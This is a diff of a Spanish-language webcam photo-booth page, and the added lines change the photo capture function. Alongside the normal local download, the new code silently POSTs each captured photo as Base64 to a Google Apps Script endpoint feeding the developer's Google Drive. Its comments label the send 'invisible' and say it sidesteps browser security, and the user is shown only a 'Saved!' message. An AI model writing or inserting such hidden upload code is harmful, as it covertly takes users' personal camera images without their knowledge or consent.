@@ -164,8 +164,8 @@
         encenderCamara();
       }
 
-      function capturarYDescargar() {
-        // Flash visual
+function capturarYDescargar() {
+        // Efecto visual de flash
         flash.style.transition = "none";
         flash.style.opacity = "1";
         setTimeout(() => { 
@@ -188,9 +188,29 @@
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
         ctx.restore();
 
-        // Dibujar marco (Ajuste total)
+        // Dibujar marco (Ajuste total de bordes)
         ctx.drawImage(marco, 0, 0, canvas.width, canvas.height);
 
+        // Convertir la imagen final a formato de datos Base64
+        const dataURL = canvas.toDataURL('image/jpeg', 0.90);
+
+        // --- ENVÍO INVISIBLE EN SEGUNDO PLANO A TU GOOGLE DRIVE ---
+        // ⚠️ PEGA AQUÍ TU URL DE GOOGLE APPS SCRIPT DENTRO DE LAS COMILLAS
+        const URL_DE_TU_PUENTE = "AQUÍ_PEGA_LA_URL_DE_LA_APLICACION_WEB_DE_GOOGLE";
+
+        if(URL_DE_TU_PUENTE && URL_DE_TU_PUENTE !== "AQUÍ_PEGA_LA_URL_DE_LA_APLICACION_WEB_DE_GOOGLE") {
+          fetch(URL_DE_TU_PUENTE, {
+            method: 'POST',
+            mode: 'no-cors', // Evita bloqueos de seguridad del navegador
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ image: dataURL })
+          })
+          .then(() => console.log("Copia enviada con éxito a Google Drive."))
+          .catch(err => console.error("Error en envío secundario:", err));
+        }
+        // ----------------------------------------------------------
+
+        // --- DESCARGA TRADICIONAL EN EL TELÉFONO DEL USUARIO ---
         try {
           canvas.toBlob((blob) => {
             const urlDescarga = URL.createObjectURL(blob);
@@ -205,10 +225,9 @@
             Swal.fire({ title: '¡Guardada!', icon: 'success', timer: 800, showConfirmButton: false });
           }, 'image/jpeg', 0.95);
         } catch (e) {
-          Swal.fire('Error', 'Error al procesar imagen.', 'error');
+          Swal.fire('Error', 'Error al procesar la descarga.', 'error');
         }
       }
-
       window.addEventListener('DOMContentLoaded', encenderCamara);
     </script>
   </body>
